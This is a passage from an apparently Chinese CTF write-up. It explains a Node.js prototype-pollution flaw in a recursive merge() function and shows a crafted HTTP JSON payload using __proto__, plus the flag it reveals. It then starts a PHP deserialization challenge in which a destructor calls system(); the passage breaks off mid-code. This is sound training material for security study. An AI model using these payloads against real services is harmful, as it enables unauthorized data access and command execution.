class="token function">floor</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token constant">ALPHABET</span><span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="24"></td><td><pre></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token comment">// 生成时间戳的文本表示，并进行一定的处理后返回</span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token keyword">const</span> <span class="token function-variable function">timeText</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">timestamp</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    timestamp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> timestamp <span class="token operator">===</span> <span class="token string">"number"</span> <span class="token operator">?</span> timestamp <span class="token operator">:</span> Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    <span class="token keyword">let</span> text1 <span class="token operator">=</span> timestamp<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> timestamp<span class="token punctuation">.</span>length <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    <span class="token keyword">let</span> text2 <span class="token operator">=</span> timestamp<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>timestamp<span class="token punctuation">.</span>length <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token keyword">let</span> text <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> text1<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        text <span class="token operator">+=</span> text1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> text2<span class="token punctuation">[</span>text2<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>text2<span class="token punctuation">.</span>length <span class="token operator">></span> text1<span class="token punctuation">.</span>length<span class="token punctuation">)</span> text <span class="token operator">+=</span> text2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    <span class="token keyword">return</span> Base58<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token function">rndText</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 长度 = 20</span></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="36"></td><td><pre></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token comment">// 生成指定长度的随机 ID，包括时间戳的文本表示</span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token keyword">const</span> <span class="token function-variable function">rndID</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">length<span class="token punctuation">,</span> timestamp</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    <span class="token keyword">const</span> t <span class="token operator">=</span> <span class="token function">timeText</span><span class="token punctuation">(</span>timestamp<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>length <span class="token operator">&lt;</span> t<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token keyword">return</span> t<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>    <span class="token keyword">else</span> <span class="token keyword">return</span> t <span class="token operator">+</span> <span class="token function">rndText</span><span class="token punctuation">(</span>length <span class="token operator">-</span> t<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="43"></td><td><pre></pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token comment">// 插入数据到数据库的异步函数</span></pre></td></tr><tr><td data-num="45"></td><td><pre><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">insert2db</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="46"></td><td><pre>    <span class="token keyword">let</span> date <span class="token operator">=</span> <span class="token function">String</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">"date"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> place <span class="token operator">=</span> <span class="token function">String</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">"place"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="47"></td><td><pre>        contact <span class="token operator">=</span> <span class="token function">String</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">"contact"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> reason <span class="token operator">=</span> <span class="token function">String</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">"reason"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>    <span class="token keyword">const</span> timestamp <span class="token operator">=</span> Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>    <span class="token keyword">const</span> wishid <span class="token operator">=</span> <span class="token function">rndID</span><span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">,</span> timestamp<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="50"></td><td><pre>    <span class="token keyword">await</span> sql<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">INSERT INTO wishes (wishid, date, place, contact, reason, timestamp) VALUES (?, ?, ?, ?, ?, ?)</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="51"></td><td><pre>        <span class="token punctuation">[</span>wishid<span class="token punctuation">,</span> date<span class="token punctuation">,</span> place<span class="token punctuation">,</span> contact<span class="token punctuation">,</span> reason<span class="token punctuation">,</span> timestamp<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">e</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span> <span class="token keyword">throw</span> e <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="52"></td><td><pre>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span> wishid<span class="token punctuation">,</span> date<span class="token punctuation">,</span> place<span class="token punctuation">,</span> contact<span class="token punctuation">,</span> reason<span class="token punctuation">,</span> timestamp <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="53"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="54"></td><td><pre></pre></td></tr><tr><td data-num="55"></td><td><pre><span class="token comment">// 合并两个对象的函数</span></pre></td></tr><tr><td data-num="56"></td><td><pre><span class="token keyword">const</span> <span class="token function-variable function">merge</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">dst<span class="token punctuation">,</span> src</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="57"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> dst <span class="token operator">!==</span> <span class="token string">"object"</span> <span class="token operator">||</span> <span class="token keyword">typeof</span> src <span class="token operator">!==</span> <span class="token string">"object"</span><span class="token punctuation">)</span> <span class="token keyword">return</span> dst<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="58"></td><td><pre>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> src<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="59"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token keyword">in</span> dst <span class="token operator">&amp;&amp;</span> key <span class="token keyword">in</span> src<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="60"></td><td><pre>            dst<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">merge</span><span class="token punctuation">(</span>dst<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> src<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="61"></td><td><pre>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="62"></td><td><pre>            dst<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> src<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="63"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="64"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="65"></td><td><pre>    <span class="token keyword">return</span> dst<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="66"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="67"></td><td><pre></pre></td></tr><tr><td data-num="68"></td><td><pre><span class="token comment">// 处理 POST 请求到 "/submit" 端点</span></pre></td></tr><tr><td data-num="69"></td><td><pre>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/submit"</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">ctx</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="70"></td><td><pre>    <span class="token comment">// 检查内容类型是否为 "application/json"</span></pre></td></tr><tr><td data-num="71"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>ctx<span class="token punctuation">.</span>header<span class="token punctuation">[</span><span class="token string">"content-type"</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">"application/json"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="72"></td><td><pre>        <span class="token keyword">return</span> ctx<span class="token punctuation">.</span>body <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="73"></td><td><pre>            <span class="token literal-property property">status</span><span class="token operator">:</span> <span class="token string">"error"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="74"></td><td><pre>            <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">"Content-Type 必须为 application/json"</span></pre></td></tr><tr><td data-num="75"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="76"></td><td><pre></pre></td></tr><tr><td data-num="77"></td><td><pre>    <span class="token comment">// 获取请求体中的原始 JSON 数据，如果为空则默认为一个空对象</span></pre></td></tr><tr><td data-num="78"></td><td><pre>    <span class="token keyword">const</span> jsonText <span class="token operator">=</span> ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>rawBody <span class="token operator">||</span> <span class="token string">"&#123;&#125;"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="79"></td><td><pre></pre></td></tr><tr><td data-num="80"></td><td><pre>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="81"></td><td><pre>        <span class="token comment">// 解析 JSON 数据</span></pre></td></tr><tr><td data-num="82"></td><td><pre>        <span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>jsonText<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="83"></td><td><pre></pre></td></tr><tr><td data-num="84"></td><td><pre>        <span class="token comment">// 检查参数的有效性</span></pre></td></tr><tr><td data-num="85"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> data<span class="token punctuation">[</span><span class="token string">"contact"</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">"string"</span> <span class="token operator">||</span> <span class="token keyword">typeof</span> data<span class="token punctuation">[</span><span class="token string">"reason"</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">"string"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="86"></td><td><pre>            <span class="token keyword">return</span> ctx<span class="token punctuation">.</span>body <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="87"></td><td><pre>                <span class="token literal-property property">status</span><span class="token operator">:</span> <span class="token string">"error"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="88"></td><td><pre>                <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">"Invalid parameter"</span></pre></td></tr><tr><td data-num="89"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="90"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">"contact"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>length <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">||</span> data<span class="token punctuation">[</span><span class="token string">"reason"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>length <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="91"></td><td><pre>            <span class="token keyword">return</span> ctx<span class="token punctuation">.</span>body <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="92"></td><td><pre>                <span class="token literal-property property">status</span><span class="token operator">:</span> <span class="token string">"error"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="93"></td><td><pre>                <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">"Parameters contact and reason cannot be empty"</span></pre></td></tr><tr><td data-num="94"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="95"></td><td><pre></pre></td></tr><tr><td data-num="96"></td><td><pre>        <span class="token comment">// 定义默认参数</span></pre></td></tr><tr><td data-num="97"></td><td><pre>        <span class="token keyword">const</span> <span class="token constant">DEFAULT</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="98"></td><td><pre>            <span class="token literal-property property">date</span><span class="token operator">:</span> <span class="token string">"unknown"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="99"></td><td><pre>            <span class="token literal-property property">place</span><span class="token operator">:</span> <span class="token string">"unknown"</span></pre></td></tr><tr><td data-num="100"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="101"></td><td><pre></pre></td></tr><tr><td data-num="102"></td><td><pre>        <span class="token comment">// 调用插入到数据库的异步函数，将数据插入到数据库</span></pre></td></tr><tr><td data-num="103"></td><td><pre>        <span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">insert2db</span><span class="token punctuation">(</span><span class="token function">merge</span><span class="token punctuation">(</span><span class="token constant">DEFAULT</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="104"></td><td><pre></pre></td></tr><tr><td data-num="105"></td><td><pre>        <span class="token comment">// 发送包含成功响应和插入的数据的响应</span></pre></td></tr><tr><td data-num="106"></td><td><pre>        ctx<span class="token punctuation">.</span>body <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="107"></td><td><pre>            <span class="token literal-property property">status</span><span class="token operator">:</span> <span class="token string">"success"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="108"></td><td><pre>            <span class="token literal-property property">data</span><span class="token operator">:</span> result</pre></td></tr><tr><td data-num="109"></td><td><pre>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="110"></td><td><pre>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="111"></td><td><pre>        <span class="token comment">// 处理错误并发送错误响应</span></pre></td></tr><tr><td data-num="112"></td><td><pre>        console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="113"></td><td><pre>        ctx<span class="token punctuation">.</span>body <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="114"></td><td><pre>            <span class="token literal-property property">status</span><span class="token operator">:</span> <span class="token string">"error"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="115"></td><td><pre>            <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">"Internal Server Error"</span></pre></td></tr><tr><td data-num="116"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="117"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="118"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="119"></td><td><pre></pre></td></tr><tr><td data-num="120"></td><td><pre><span class="token comment">// 导出该路由以供其他模块使用</span></pre></td></tr><tr><td data-num="121"></td><td><pre>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></pre></td></tr></table></figure><p>可以在这里看到注入点：</p><figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">const</span> <span class="token function-variable function">merge</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">dst<span class="token punctuation">,</span> src</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> dst <span class="token operator">!==</span> <span class="token string">"object"</span> <span class="token operator">||</span> <span class="token keyword">typeof</span> src <span class="token operator">!==</span> <span class="token string">"object"</span><span class="token punctuation">)</span> <span class="token keyword">return</span> dst<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> src<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token keyword">in</span> dst <span class="token operator">&amp;&amp;</span> key <span class="token keyword">in</span> src<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>            dst<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">merge</span><span class="token punctuation">(</span>dst<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> src<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>            dst<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> src<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">return</span> dst<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token comment">// 调用插入到数据库的异步函数，将数据插入到数据库</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">insert2db</span><span class="token punctuation">(</span><span class="token function">merge</span><span class="token punctuation">(</span><span class="token constant">DEFAULT</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>只要考虑注入 <code>data['__proto__']['min_public_time']</code> 的值即可</p><p>构造 payload:</p><figure class="highlight http"><figcaption data-lang="HTTP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/submit</span> <span class="token http-version property">HTTP/1.1</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">ea7a79c9-28eb-4d7c-b50c-08347f75dffa.node4.buuoj.cn:81</span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://ea7a79c9-28eb-4d7c-b50c-08347f75dffa.node4.buuoj.cn:81/</span></span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36</span></span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/json</span></span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">*/*</span></span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.9</span></span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://ea7a79c9-28eb-4d7c-b50c-08347f75dffa.node4.buuoj.cn:81</span></span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">81</span></span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token application-json"></span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">&#123;</span><span class="token string-property property">"date"</span><span class="token operator">:</span><span class="token string">"12"</span><span class="token punctuation">,</span><span class="token string-property property">"place"</span><span class="token operator">:</span><span class="token string">"12"</span><span class="token punctuation">,</span><span class="token string-property property">"contact"</span><span class="token operator">:</span><span class="token string">"21"</span><span class="token punctuation">,</span><span class="token string-property property">"reason"</span><span class="token operator">:</span><span class="token string">"12"</span><span class="token punctuation">,</span><span class="token string-property property">"timestamp"</span><span class="token operator">:</span><span class="token number">1699615187967</span><span class="token punctuation">,</span><span class="token string-property property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token string-property property">"min_public_time"</span><span class="token operator">:</span><span class="token string">"1001-01-01"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>直接让其等于 1001-01-01, 再访问 /info/ 界面就可以看到：</p><figure class="highlight http"><figcaption data-lang="HTTP"></figcaption><table><tr><td data-num="1"></td><td><pre>&#123;</pre></td></tr><tr><td data-num="2"></td><td><pre>            "wishid": "2ma2TNsiQRmchxySEYefyRjm",</pre></td></tr><tr><td data-num="3"></td><td><pre>            "date": "2021-09-27",</pre></td></tr><tr><td data-num="4"></td><td><pre>            "place": "学園都市",</pre></td></tr><tr><td data-num="5"></td><td><pre>            "contact": "御坂美琴",</pre></td></tr><tr><td data-num="6"></td><td><pre>            "reason": "海胆のような顔をしたあいつが大覇星祭で私に負けた、彼を連れて出かけるつもりだ。彼を携帯店のカップルのイベントに連れて行きたい（イベントでプレゼントされるゲコ太は超レアだ！）晴れの日が必要で、彼を完全にやっつける！ゲコ太の抽選番号はflag&#123;89310f17-3405-49bb-89ef-c41dcffc0332&#125;です",</pre></td></tr><tr><td data-num="7"></td><td><pre>            "timestamp": 1190726040548</pre></td></tr><tr><td data-num="8"></td><td><pre>        &#125;,</pre></td></tr></table></figure><p>验证一下时间戳：1190726040 2007-09-25 21:14:00</p><p>和理想一样。</p><h2 id="week4"><a class="anchor" href="#week4">#</a> Week4</h2><h3 id="逃"><a class="anchor" href="#逃">#</a> 逃</h3><p>题目：</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"bad"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"good"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">GetFlag</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token variable">$key</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">GetFlag</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token 